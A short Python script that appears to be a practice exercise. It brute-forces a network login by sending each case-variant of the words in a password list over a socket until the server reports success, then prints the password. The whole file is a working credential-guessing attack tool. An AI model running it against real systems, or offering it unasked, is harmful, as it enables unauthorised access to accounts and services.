import socket
import itertools
import sys
import string
import os


HOST = sys.argv[1]
PORT = int(sys.argv[2])
ADRESS = (HOST, PORT)
numbers = string.digits
whole_list = []
flag = False
password = ""
n = 1


def variant(file):
    with open(file, "r") as f:
        for pw in f.readlines():
            pw = pw.strip("\n")
            for variation in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in pw))):
                yield variation


var = variant("passwords.txt")


with socket.socket() as s:
    s.connect(ADRESS)
    while not flag:
        try:
            password = next(var)
            password = password.encode()
            s.send(password)
            result = s.recv(10240)
            result = result.decode()
            if result == "Connection success!":
                password = password.decode()
                print(password)
                flag = True
                break
        except StopIteration:
            print('All passwords have been attempted!')
            break


